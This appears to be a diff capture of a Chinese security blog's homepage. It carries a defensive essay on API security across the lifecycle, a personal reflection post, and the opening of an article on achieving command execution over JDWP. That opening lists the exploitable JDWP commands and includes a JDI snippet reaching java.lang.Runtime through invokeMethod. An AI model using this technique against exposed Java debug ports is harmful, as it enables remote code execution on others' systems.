+3. API中的关键设施1、API管理API资产管理平台是API中的关键设施，从上文的API安全生命周期中可以看到，在各个环节都要依赖该平台能力，简单总结大致需要这几点功能：
+
+API资产自动发现能力，能否覆盖影子资产是关键
+API流量监控能力，持续性的对API的总流量及异常流量等各类API数据进行记录
+API敏感数据识别能力，API会涉及哪些敏感数据
+API画像构建能力，调用方、调用量等等
+
+API网关在一定程度上也会承载API管理的角色，但是一个公司里，往往不会只有一个API网关，甚至是很多API并没有走API网关，所以从安全的角度，需要有一个all in one的API管理平台。
+2、API网关近几年微服务架构的兴起使得API 网关成为必要的关键设施，庞大的业务系统被拆分成许多粒度更小的微服务，进行独立部署和维护，这种模式带来了更多的跨系统交互，应用API 的规模也爆发增加，API网关已然成为了微服务架构的标配组件。
+一个典型的API网关往往承载了非常多的能力，例如路由、限流、版本控制、运行情况监控等，但是在这里只聊安全性。
+
+API网关在安全性中的角色主要是“身份验证”和“访问控制”。API网关的访问控制功能通常从身份验证机制开始，用来确定API调用实际来源。
+身份验证方式主要有：
+
+API密钥：例如签名等
+基础身份验证：账号、密码登录
+OAuth2.0、OpenID Connect 、SAML等
+
+访问控制主要涉及API的访问控制，哪些用户、调用方可以访问，这里需要和账号体系中的角色进行判断。
+3、API权限设计权限失效类的风险主要包括以下几类：
+
+API未授权访问
+API水平越权
+API垂直越权
+
+除了上边说的三类权限漏洞，结合业务场景，一般会将权限分为两类
+
+API功能性权限/菜单权限（用户有没有权限访问这个功能/菜单）
+API数据性权限（用户有没有权限访问其它用户的数据）
+
+大多数情况下，只要开发人员有安全意识，往往不会遗漏权限校验。但是往往因为业务紧急情况或者对于架构的错误理解，对权限做出一些错误的理解。当然，还有很多没有安全意识的开发人员，认为有了登录就万事大吉了，这种情况就只能加强安全意识培训了。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本文的由来主要是最近一年来对内部API风险治理过程中的总结。因为API的种类繁多，并没有写的很详细，但是在其中表达了很多API治理的思路和经验总结。在WAF、黑白盒扫描器、RASP越来越成熟的今天，API导致的逻辑类风险将是各公司面临的最大难题，希望本文可以给予同行者们一些帮助。</p>
+<h1 id="一、什么是API"><a href="#一、什么是API" class="headerlink" title="一、什么是API"></a>一、什么是API</h1><p>应用编程接口（API）由一组用于集成应用软件和服务的工具、定义和协议组合而成 <a class="link" target="_blank" rel="noopener" href="https://www.redhat.com/zh/topics/api">https://www.redhat.com/zh/topics/api<i class="fas fa-external-link-alt"></i></a> 。设计方式主要遵循SOAP协议或者REST架构。SOAP和REST的关系此处不在赘述，详情可以看<a class="link" target="_blank" rel="noopener" href="https://www.redhat.com/zh/topics/integration/whats-the-difference-between-soap-resth%E3%80%82">https://www.redhat.com/zh/topics/integration/whats-the-difference-between-soap-resth。<i class="fas fa-external-link-alt"></i></a> </p>
+<p>API 既可以私有（仅供内部使用），也可以合用（与特定合作伙伴共享以创造更多收益）或公用（允许第三方开发的应用能与您的API 交互，从而推动创新）。</p>
+<p>在大多数情况下，企业会采用微服务架构，想要通过加速软件开发来满足需求。基于 HTTP 的 API 已成为微服务架构之间同步交互的首选方法。因为它们可以降低部署、可扩展性和维护的复杂性和开销。这些 API 是将所有微服务连接在一起的粘合剂。API被广泛的应用在各种业务中，也导致大量不规范的API发布到线上，将风险暴露在攻击者的视线中。</p>
+<h1 id="二、API生命周期"><a href="#二、API生命周期" class="headerlink" title="二、API生命周期"></a>二、API生命周期</h1><p>生命周期就是指一个对象的生老病死。其实所有的非瞬时性的对象都有着自己的生命周期，诞生-存在-消亡。</p>
+<p>￼<img lazyload src="/images/loading.svg" data-src="live.png" alt="live"></p>
+<p>那结合我们的实际经验，可以总结出API的生命周期，设计-开发-测试-上线-运行-迭代-下线。</p>
+<p>￼<img lazyload src="/images/loading.svg" data-src="life.png" alt="life"></p>
+<h1 id="三、API安全生命周期"><a href="#三、API安全生命周期" class="headerlink" title="三、API安全生命周期"></a>三、API安全生命周期</h1><h2 id="1-API面临的主要网络攻击"><a href="#1-API面临的主要网络攻击" class="headerlink" title="1. API面临的主要网络攻击"></a>1. API面临的主要网络攻击</h2><p>在聊API安全生命周期之前，首先我们要思考一下，API会遇到哪些攻击。API作为业务的表达，承载着大量的数据和生产资料，主要的攻击主要包括以下几种：</p>
+<ol>
+<li><p>失陷的访问控制<br> “失陷的访问控制”也就是常说的“越权”，荣登OWASP 2021的Top 1。API的访问控制失效，攻击方可直接调用API进行增删改查操作，造成数据泄漏或者生产中断。在有一定安全水位的企业里，越权漏洞一定是高危漏洞种类的重要组成。</p>
+</li>
+<li><p>数据泄漏(敏感数据暴露、加密失败)<br>   数据泄漏风险可以说是现在企业面临的最高网络攻击风险了，主要的泄漏途径除了被入侵拖库，就是API的数据过度透出、访问控制缺陷导致被批量调用泄漏数据。随着现在大公司的网络边界安全水位越来越高，被入侵拖库的难度已经非常大了，但是不规范的API暴露的数据泄漏敞口仍然是非常之多。</p>
+</li>
+<li><p>Web网络攻击<br>   针对API的Web网络攻击主要包括DDoS攻击、注入攻击等等。这类传统web攻击类型作为一类，它们的共同点就是可以通过一定的策略进行拦截。</p>
+</li>
+</ol>
+<h2 id="2-API生命周期中的安全"><a href="#2-API生命周期中的安全" class="headerlink" title="2. API生命周期中的安全"></a>2. API生命周期中的安全</h2><p>上面讲的都是外部的网络攻击威胁，但产生这些风险的原因都是内因，我们顺着API生命周期来看每一个环节中缺少的安全部分以及难点。</p>
+<p>￼￼<img lazyload src="/images/loading.svg" data-src="seclife.png" alt="seclife"></p>
+<h3 id="1-设计阶段"><a href="#1-设计阶段" class="headerlink" title="1. 设计阶段"></a>1. 设计阶段</h3><p>绝大部分开发同学都想开发出安全和可靠的API，但是在设计之初以及开发过程中，因为自身对风险的整体认知不足，往往很难做到完善可靠的安全设计。在设计阶段，产品、开发等会多次对焦需求和设计方案，但是往往安全的角色在这里是缺席的。</p>
+<p>理想情况下，如果每个API的设计阶段都有安全工程师参与其中对其进行威胁建模，那线上的API风险将会大大减少。但是我们都知道，在 安全:开发 = 1:1000 的现状下，人工覆盖每个API的威胁建模将永远是一个美好的想象。</p>
+<p>安全部分：</p>
+<p>将威胁建模加入到API设计阶段，给出可能发生的风险解决建议和方案。</p>
+<p>实施难点：</p>
+<p>安全工程师在公司中的人数往往比较少，难以人工覆盖。</p>
+<p>实现建议：</p>
+<p>建设自动化威胁建模能力，同时对业务进行分层。采用“重点业务人工评审”和“非重点业务自动化威胁建模”相结合的方式，可以有效的对核心高风险接口进行覆盖。在过去半年里，我们在公司内部落地了这个思路，效果非常明显。</p>
+<h3 id="2-开发阶段"><a href="#2-开发阶段" class="headerlink" title="2. 开发阶段"></a>2. 开发阶段</h3><p>开发过程中，安全基本没有机会参与其中，能做的大概就是提供API安全开发规范、安全开发插件、安全辅助包等辅助性安全开发工具。是否使用，全看开发同学的安全意识以及开发项目的紧迫程度。</p>
+<p>再一个有用的则是白盒代码扫描，嵌入到CI/CD流程中，发布到测试环境时就进行扫描。但是白盒代码扫描的弊端也很明显，对于逻辑类的风险，目前尚未有很好的检测工具，API是否包含敏感数据也很难判断。</p>
+<p>安全部分：</p>
+<ol>
+<li>API安全开发规范、安全开发插件、安全辅助包</li>
+<li>嵌入到CI/CD流程中的白盒代码扫描工具</li>
+</ol>
+<p>实施难点：</p>
+<p>如何让开发人员将这些安全辅助工具用起来是个挑战，安全意识培养在于一点一滴的积累。</p>
+<p>实现建议：</p>
+<p>白盒代码扫描实现越权等逻辑类漏洞的检测，在我看来是未来最有可能有效解决逻辑类漏洞的方向之一。但是到现在尚未看到有准确率高、可大规模覆盖使用的产品出现。不过各个公司内部应该都在进行着类似的实现，期待。</p>
+<h3 id="3-测试阶段"><a href="#3-测试阶段" class="headerlink" title="3. 测试阶段"></a>3. 测试阶段</h3><p>如果利用得当，测试阶段将是保证API安全上线的一个关键环节。无论是自动化测试流程还是人工测试，都会对API的业务逻辑实现、稳定性等进行策略，越重要的业务覆盖的越全面。如果在测试的CheckList中加入API相关的内容，则可以接入测试的能力发现API的安全问题。</p>
+<p>在这里有一个关键问题，那就是API安全漏洞是否属于bug，例如API的权限校验失效，是否应该算进未被发现的bug数量中。这个共识如果可以达成，那接下来就可以去讨论如何合作了，无论是嵌入到自动化测试平台或者人工测试的CheckList中。在笔者看来，这个共识并不是很难达成，当然这也要看生产关系是怎样的。</p>
+<p>安全部分：</p>
+<p>与测试团队达成共识，API安全漏洞等于BUG，在此基础上，结合已有的基础设施进行合作，与测试团队共同在上线前发现API的安全风险。</p>
+<p>实施难点：</p>
+<ol>
+<li>测试团队的工作往往也比较饱和，要想达成共识最好能从上到下进行</li>
+<li>测试团队人员的安全专业能力往往欠缺，需要安全团队给予安全能力培训或者提供安全工具辅助发现安全风险</li>
+</ol>
+<p>实现建议：</p>
+<p>主要还是三个要点：与测试团队达成共识、提供自动化的测试工具以及提高测试同学的安全专业能力。</p>
+<h3 id="4-上线阶段"><a href="#4-上线阶段" class="headerlink" title="4. 上线阶段"></a>4. 上线阶段</h3><p>API发布上线阶段是最关键的环节之一。如果API的漏洞在设计、开发、测试环节中没有被发现，那这将是最后的机会去阻止漏洞产生了，一旦发布到线上，那就只能和攻击者赛跑了。</p>
+<p>到这个阶段，理论上传统Web漏洞应该已经都被黑白盒漏洞扫描工具发现出来了，如果还没有，那就很难发现了。但是API权限和API数据相关的漏洞在上线阶段是很容易被安全同学挖掘出来的，不过这里也存在一个人力分配的情况。根据笔者的经验，在这个阶段将有限的安全人力投入到高风险的资产中是最具性价比的。什么样的API是高风险的呢？涉及敏感信息的、涉及资金的、涉及核心基础设施操作的，等等，与设计阶段的评审一样，分层治理。</p>
+<p>安全部分：</p>
+<p>通过建设自动化发现高风险API能力，例如通过测试流量识别敏感数据API等，对高风险API进行人工安全上线评审，将高危API漏洞拦截在上线前。</p>
+<p>实施难点：</p>
+<p>主要的难点应该是如何发现高风险的“影子资产”API，在聚光灯的API资产，出现风险的概率往往比较低，但是那些不在我们视线中的API，往往因为没有经过安全评审，产生严重的漏洞。业务、应用越多，“影子资产”API也会越多，如果对API资产进行全面的覆盖、管理，是一个非常有意义且重要的题目。</p>
+<p>实现建议：</p>
+<p>可以先从流量、日志入手，找到测试环境的流量，通过其识别哪些资产属于高风险资产，“影子资产”API的发现也可以类似的方式持续发现。</p>
+<h3 id="5-运行阶段"><a href="#5-运行阶段" class="headerlink" title="5. 运行阶段"></a>5. 运行阶段</h3><p>运行阶段，API风险往往已经暴露在互联网，随时可能被攻击利用。这个节点的重心要做两件事，API被攻击情况的监控以及API漏洞的持续巡检。</p>
+<p>API被攻击情况的监控：例如通过WAF监控阻断SQL注入请求、通过防爬拦截掉尝试利用API越权漏洞获取数据的请求、通过UEBA发现利用自身权限批量获取敏感数据的行为等等。主要的监控能力需要具备WAF拦截、DDoS防御、爬虫拦截、用户异常行为检测等。</p>
+<p>安全部分：</p>
+<p>通过流量安全监控平台对风险进行检测、阻断，同时结合完善的应急响应流程，对攻击事件进行处置。</p>
+<p>实施难点：</p>
+<ol>
+<li>数据窃取类流量和真实业务流量相似度较高，通过传统的规则策略发现难度较大</li>
+<li>内部人员利用API获取数据的检测难度大</li>
+</ol>
+<p>实现建议：</p>
+<p>购买或者自研各类监控平台，对高风险API进行重点监控，同时针对各种类型的API风险，制定完善可靠的应急SOP。</p>
+<h3 id="6-迭代阶段"><a href="#6-迭代阶段" class="headerlink" title="6. 迭代阶段"></a>6. 迭代阶段</h3><p>这个阶段可能是最令人头疼的了，即便是这个API上线时经过各种扫描、评审，确定没有安全风险了，后边随着业务需求变化发生改动，就很容易产生新的风险，特别是当开发人员认为前期已经做过非常多的安全检测后，不太可能再出问题时。</p>
+<p>安全部分：</p>
+<ol>
+<li>需要我们建设响应的API迭代发现能力，当API发生高风险迭代时，介入安全评审流程。</li>
+</ol>
+<p>实施难点：</p>
+<ol>
+<li>当API发生迭代后，API的名称和API的参数可能并不会发生变化，却在返回值中透出了敏感数据</li>
+</ol>
+<p>实现建议：</p>
+<ol>
+<li>监控API的返回值，当历史API的返回值中新增敏感数据时，介入安全评审</li>
+<li>监控代码仓库变更，当发现API方法代码发生变更时，介入安全评审</li>
+<li>监控历史API的名称、入参等，当发生变化时，介入安全评审</li>
+</ol>
+<h3 id="7-下线阶段"><a href="#7-下线阶段" class="headerlink" title="7. 下线阶段"></a>7. 下线阶段</h3><p>大量的API在完成自己的使命后，没有被及时下线，不仅会浪费系统资源，还会变成潜在的线上风险。例如一个API存在越权漏洞，但是因为没有流量一直没有被发现，直到有一天被攻击者利用。</p>
+<p>安全部分：</p>
+<ol>
+<li>需要我们针对该下线未下线的API建立API生命周期流程管理，催动无流量API下线。</li>
+</ol>
+<p>实施难点：</p>
+<ol>
+<li>如何识别哪些API是应该下线的，部分API在特殊业务场景下，可能在一年中只会使用几次，这部分要单独维护</li>
+</ol>
+<p>实现建议：</p>
+<ol>
+<li>监控API的流量变化，对一段时间内无流量的API启动下线流程</li>
+</ol>
+<h2 id="3-API中的关键设施"><a href="#3-API中的关键设施" class="headerlink" title="3. API中的关键设施"></a>3. API中的关键设施</h2><h3 id="1、API管理"><a href="#1、API管理" class="headerlink" title="1、API管理"></a>1、API管理</h3><p>API资产管理平台是API中的关键设施，从上文的API安全生命周期中可以看到，在各个环节都要依赖该平台能力，简单总结大致需要这几点功能：</p>
+<ol>
+<li>API资产自动发现能力，能否覆盖影子资产是关键</li>
+<li>API流量监控能力，持续性的对API的总流量及异常流量等各类API数据进行记录</li>
+<li>API敏感数据识别能力，API会涉及哪些敏感数据</li>
+<li>API画像构建能力，调用方、调用量等等</li>
+</ol>
+<p>API网关在一定程度上也会承载API管理的角色，但是一个公司里，往往不会只有一个API网关，甚至是很多API并没有走API网关，所以从安全的角度，需要有一个all in one的API管理平台。</p>
+<h3 id="2、API网关"><a href="#2、API网关" class="headerlink" title="2、API网关"></a>2、API网关</h3><p>近几年微服务架构的兴起使得API 网关成为必要的关键设施，庞大的业务系统被拆分成许多粒度更小的微服务，进行独立部署和维护，这种模式带来了更多的跨系统交互，应用API 的规模也爆发增加，API网关已然成为了微服务架构的标配组件。</p>
+<p>一个典型的API网关往往承载了非常多的能力，例如路由、限流、版本控制、运行情况监控等，但是在这里只聊安全性。</p>
+<p><img lazyload src="/images/loading.svg" data-src="gateway.jpeg" alt="gateway"></p>
+<p>API网关在安全性中的角色主要是“身份验证”和“访问控制”。API网关的访问控制功能通常从身份验证机制开始，用来确定API调用实际来源。</p>
+<p>身份验证方式主要有：</p>
+<ol>
+<li>API密钥：例如签名等</li>
+<li>基础身份验证：账号、密码登录</li>
+<li>OAuth2.0、OpenID Connect 、SAML等</li>
+</ol>
+<p>访问控制主要涉及API的访问控制，哪些用户、调用方可以访问，这里需要和账号体系中的角色进行判断。</p>
+<h3 id="3、API权限设计"><a href="#3、API权限设计" class="headerlink" title="3、API权限设计"></a>3、API权限设计</h3><p>权限失效类的风险主要包括以下几类：</p>
+<ol>
+<li>API未授权访问</li>
+<li>API水平越权</li>
+<li>API垂直越权</li>
+</ol>
+<p>除了上边说的三类权限漏洞，结合业务场景，一般会将权限分为两类</p>
+<ol>
+<li>API功能性权限/菜单权限（用户有没有权限访问这个功能/菜单）</li>
+<li>API数据性权限（用户有没有权限访问其它用户的数据）</li>
+</ol>
+<p>大多数情况下，只要开发人员有安全意识，往往不会遗漏权限校验。但是往往因为业务紧急情况或者对于架构的错误理解，对权限做出一些错误的理解。当然，还有很多没有安全意识的开发人员，认为有了登录就万事大吉了，这种情况就只能加强安全意识培训了。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Nov 15 2021 21:00:00 GMT+0800">2021-11-15</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/API%E5%AE%89%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E8%BE%BE%E5%85%8B%E6%95%88%E5%BA%94%E3%80%81%E5%82%BB%E9%80%BC%E9%80%9F%E7%8E%87%E4%B8%8E%E8%87%AA%E6%88%91%E6%80%80%E7%96%91%E7%9A%84%E8%BF%99%E5%8D%8A%E5%B9%B4/">
+                        达克效应、傻逼速率与自我怀疑的这半年
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        达克效应：无知要比知识更容易产生自信。
+傻逼速率：检验自己有没有成长的关键就是看你往回看自己，觉得自己说过的话，做过的事跟傻逼一样，就说明你进步了。
+今天在整理以往的笔记时，发现了这两个名词。再回想过去的这两年，发现自己的傻逼速率已经非常低了。
+在前些年，我会频繁的删除自己在博客、朋友圈、微博等平台上发表的言论，因为每隔一段时间去看，就会觉得自己怎么会写出这么矫情/低级/没有思考的文字（这篇公众号也有可能是这样的），觉得当时的自己好傻逼。
+但是最近一两年的自己，明显感觉到自己不够傻逼了。输出几乎为零，输入的东西也没有体系化。每天忙忙碌碌，感觉自己做了很多事情，但是回过头看下自己做的事情，却没有什么值得引以为豪的，真正对社会产生价值的事情。
+大概是速率降到了足够低的程度，最近半年以来，会经常性的陷入到自我怀疑的状态中，会去想自己的“存在意义”到底是什么，什么事情可以值得自己一生去追求。这个答案至今仍无法回答自己。
+不过经过这半年来的思考和调整，已经有了些许答案，这里放在下文去讲。插入一下“达克效应”。
+为什么在这里插入这个话题呢？因为在这自我怀疑的半年中，从外界输入了很多知识、思想，在求索的过程中认知的边界得到了扩大，认知圆的边也越来越长，过程中在脑海里闪现过之前无数个无知的片段。
+或许也是人的一种通病，当对一个领域在完全没有认知的时候，会感觉到神秘、向往，但凡有了一点认知或取得了一点成绩，就会盲目的产生自信，能力差的人就会高估自己的水平，认为自己已经掌握了这个领域，进而不能正确的认识到这个领域中真正具备此领域技能人的水平。
+想想是不是有时候看几眼别人的PPT就觉得自己也行了。比如SRC漏洞挖掘，只因为几年前自己挖过几个漏洞，然后在后台看到很多漏洞的实现非常简单，就觉得谁上都行。这就是一个典型的无知的例子。
+就在我盲目的觉得谁上都行的时候，自我怀疑的脑海中一直有个念头，“你行你上啊”。因此我在某个假期的时候认真的去思考了如何持续的挖掘到大公司的漏洞并且进行了一系列的实践，事实证明，如果要保证持续产出，将是一项脑力+精力+经验+时间的高难度挑战，在保证当前工作的情况下难以做到。
+真正触发自己开始思考这个问题起因还是这几个月在搞的“异常行为检测”，从策略到模型，中间多次陷入瓶颈，以为大抵就这样了，然后在查阅资料的过程中一次次的恍然大悟，才真正的认识到自己在这个领域就是一个彻彻底底的弟弟。
+还有许许多多不方便在这里提及的事情表明，在每一个小领域里，想要做到出彩并不容易，到做到盲目认知却很容易。
+也借着这篇文章输出一下自己阶段性的思考：
+关于“三观”：
+三观没有所谓对错，在整个人生范围内，知道自己的所求，知道自己的存在意义，并为之去追寻，便是自己的“人生观”。
+但是这个的前提在于你的“价值观”足够多元，知道什么事情对自己重要。如果你的价值观里只有钱，哪你的人生意义大抵只能去赚钱了。
+而如何让“价值观”多元，则需要“世界观”的足够丰富。学习的越多、知道的越多、见识的越多，则越丰富，也就对自己的“人生观”更清晰。
+关于“存在意义”：
+在过去半年多的时间里，经常问自己“你的梦想是什么？”，现在还没有一个结果，但明显的感觉到自己的傻逼速率已经重回正轨，to do list 里面还有很多等待自己去补全，雾虽大但路就在脚下。
+最后的最后，就用曾老的一句话结尾吧：
+“灵明无着，物来顺应，未来不迎，当时不杂，既过不恋。”
+记于2021.11.14凌晨两点
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>达克效应：无知要比知识更容易产生自信。</p>
+<p>傻逼速率：检验自己有没有成长的关键就是看你往回看自己，觉得自己说过的话，做过的事跟傻逼一样，就说明你进步了。</p>
+<p>今天在整理以往的笔记时，发现了这两个名词。再回想过去的这两年，发现自己的傻逼速率已经非常低了。</p>
+<p>在前些年，我会频繁的删除自己在博客、朋友圈、微博等平台上发表的言论，因为每隔一段时间去看，就会觉得自己怎么会写出这么矫情/低级/没有思考的文字（这篇公众号也有可能是这样的），觉得当时的自己好傻逼。</p>
+<p>但是最近一两年的自己，明显感觉到自己不够傻逼了。输出几乎为零，输入的东西也没有体系化。每天忙忙碌碌，感觉自己做了很多事情，但是回过头看下自己做的事情，却没有什么值得引以为豪的，真正对社会产生价值的事情。</p>
+<p>大概是速率降到了足够低的程度，最近半年以来，会经常性的陷入到自我怀疑的状态中，会去想自己的“存在意义”到底是什么，什么事情可以值得自己一生去追求。这个答案至今仍无法回答自己。</p>
+<p>不过经过这半年来的思考和调整，已经有了些许答案，这里放在下文去讲。插入一下“达克效应”。</p>
+<p>为什么在这里插入这个话题呢？因为在这自我怀疑的半年中，从外界输入了很多知识、思想，在求索的过程中认知的边界得到了扩大，认知圆的边也越来越长，过程中在脑海里闪现过之前无数个无知的片段。</p>
+<p>或许也是人的一种通病，当对一个领域在完全没有认知的时候，会感觉到神秘、向往，但凡有了一点认知或取得了一点成绩，就会盲目的产生自信，能力差的人就会高估自己的水平，认为自己已经掌握了这个领域，进而不能正确的认识到这个领域中真正具备此领域技能人的水平。</p>
+<p>想想是不是有时候看几眼别人的PPT就觉得自己也行了。比如SRC漏洞挖掘，只因为几年前自己挖过几个漏洞，然后在后台看到很多漏洞的实现非常简单，就觉得谁上都行。这就是一个典型的无知的例子。</p>
+<p>就在我盲目的觉得谁上都行的时候，自我怀疑的脑海中一直有个念头，“你行你上啊”。因此我在某个假期的时候认真的去思考了如何持续的挖掘到大公司的漏洞并且进行了一系列的实践，事实证明，如果要保证持续产出，将是一项脑力+精力+经验+时间的高难度挑战，在保证当前工作的情况下难以做到。</p>
+<p>真正触发自己开始思考这个问题起因还是这几个月在搞的“异常行为检测”，从策略到模型，中间多次陷入瓶颈，以为大抵就这样了，然后在查阅资料的过程中一次次的恍然大悟，才真正的认识到自己在这个领域就是一个彻彻底底的弟弟。</p>
+<p>还有许许多多不方便在这里提及的事情表明，在每一个小领域里，想要做到出彩并不容易，到做到盲目认知却很容易。</p>
+<p>也借着这篇文章输出一下自己阶段性的思考：</p>
+<p>关于“三观”：</p>
+<p>三观没有所谓对错，在整个人生范围内，知道自己的所求，知道自己的存在意义，并为之去追寻，便是自己的“人生观”。</p>
+<p>但是这个的前提在于你的“价值观”足够多元，知道什么事情对自己重要。如果你的价值观里只有钱，哪你的人生意义大抵只能去赚钱了。</p>
+<p>而如何让“价值观”多元，则需要“世界观”的足够丰富。学习的越多、知道的越多、见识的越多，则越丰富，也就对自己的“人生观”更清晰。</p>
+<p>关于“存在意义”：</p>
+<p>在过去半年多的时间里，经常问自己“你的梦想是什么？”，现在还没有一个结果，但明显的感觉到自己的傻逼速率已经重回正轨，to do list 里面还有很多等待自己去补全，雾虽大但路就在脚下。</p>
+<p>最后的最后，就用曾老的一句话结尾吧：</p>
+<p>“灵明无着，物来顺应，未来不迎，当时不杂，既过不恋。”</p>
+<p>记于2021.11.14凌晨两点</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Nov 14 2021 21:00:00 GMT+0800">2021-11-14</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E8%BE%BE%E5%85%8B%E6%95%88%E5%BA%94%E3%80%81%E5%82%BB%E9%80%BC%E9%80%9F%E7%8E%87%E4%B8%8E%E8%87%AA%E6%88%91%E6%80%80%E7%96%91%E7%9A%84%E8%BF%99%E5%8D%8A%E5%B9%B4/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E4%BB%8E%E7%BC%96%E5%86%99JDI%E8%B0%83%E8%AF%95%E5%88%B0%E5%AE%9E%E7%8E%B0JDWP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                        从编写JDI调试到实现JDWP命令执行
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        1.JPDAJPDA(Java Platform Debugger Architecture) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。JPDA 主要由三个部分组成：
+Java 虚拟机工具接口（JVMTI）
+Java 调试线协议（JDWP）
+Java 调试接口（JDI）
+
+
+2.JVM TIJVMTI其实就是一套由虚拟机直接提供的本地代码接口，包含了调试、监听、线程分析及覆盖率分析等接口，它处于整个JPDA体系的最底层。
+一般可以通过采用建立一个Agent的方式来使用JVMTI，其显著的特征就是通过设置回调函数的方式，从java虚拟机上得到当前运行态信息，并做出自己的相应的操作，抑或操作虚拟机的运行态，以达到一些特定的目的（如优化程序性能）。
+把Agent编译成一个动态链接库后，就可以在java程序启动/运行的时候（增加启动参数agentlib/ agentpath）来加载它。
+以启动时加载为例:
+
+3.JDWPJDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。
+Target vm 中运行着我们希望要调试的程序，它与一般运行的 Java 虚拟机没有什么区别，只是在启动时加载了 Agent JDWP 从而具备了调试功能。
+debugger 向运行中的 target vm 发送命令来获取 target vm 运行时的状态和控制 Java 程序的执行。
+3.1JDWP Start Up在建立传输链接之后，连接的两端首先会进行握手，然后再进行其它数据包的传输。握手的步骤有以下两步：    1. debugger侧发送14 bytes 的 14个ASCII字符 “JDWP-Handshake”到VM中；    2. VM回复相同的14 bytes “JDWP-Handshake” 完成握手。
+https://docs.oracle.com/en/java/javase/12/docs/specs/jdwp/jdwp-spec.html
+3.2Packet结构命令包（command packet）和回复包（reply packet），Packet分为包头（header）和数据（data）两部分组成。包头部分的结构和长度是固定的，而数据部分的长度是可变的。command packet和reply packet的包头长度相同，都是11个bytes。
+
+Length 和 Id 字段是不言自明的。Flag 字段仅用于区分请求包和回复包，值为 0x80 表示回复包。CommandSet 字段定义了命令的类别，如下表所示。 
+1234命令集	      命令0x40	       JVM 采取的行动（例如设置断点）0x40–0x7F	   向调试器提供事件信息（例如，JVM 已达到断点并等待进一步的操作）0x80	       第三方扩展
+
+请记住，我们要执行任意代码，以下命令对我们来说是最有趣的。    •    VirtualMachine/IDSizes 定义了 JVM 处理的数据结构的大小。这是 nmap 脚本 jdwp-exec.nse[11] 不起作用的原因之一，因为该脚本使用硬编码的大小。    •    ClassType/InvokeMethod 允许您调用静态函数。    •    ObjectReference/InvokeMethod 允许您从 JVM 中的实例化对象调用函数。    •    StackFrame/(Get|Set)Values 提供从线程堆栈推送/弹出功能。    •    Event/Composite 强制 JVM 对该命令声明的特定行为做出反应。此命令是调试目的的主要关键，因为它允许设置断点，在运行时单步执行线程，并在以与 GDB 或 WinDBG 完全相同的方式访问/修改值时收到通知。 JDWP 不仅允许您访问和调用已驻留在内存中的对象，还允许您创建或覆盖数据。    •    VirtualMachine/CreateString 允许您将字符串转换为存在于 JVM 运行时中的 java.lang.String。    •    VirtualMachine/RedefineClasses 允许您安装新的类定义。
+上述的定义是重要的，JDI可以利用invokeMethod调用目标 VM 中此对象的指定方法，这是实现命令执行的关键
+12345ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);…….ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);
+
+
+3.3Using JDWPjava -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=8000
+-agentlib:jdwp ：JVM加载jdwp代理
+transport=dt_socket ： 使用socket传输
+server=y ： JVM将listen for a debugger注入到其中
+suspend=y  ： JVM在执行主类之前等待debugger attach，如果设置为n，则直接执行主类，同时进行监听
+address=8000 ： 指定套接字的端口，在JDK9及以后，这种配置只监听localhost的8000端口
+
+4.Debug过程1、先建立起了 socket 连接
+2、将断点位置创建了断点事件通过 JDI 接口传给了 服务端（程序端）的 VM，VM 调用 suspend 将 VM 挂起
+3、VM 挂起之后将客户端需要获取的 VM 信息返回给客户端，返回之后 VM resume 恢复其运行状态
+4、客户端获取到 VM 返回的信息之后可以通过不同的方式展示给客户
+4.1基于JDI编写一个调试代码1.创建Connector
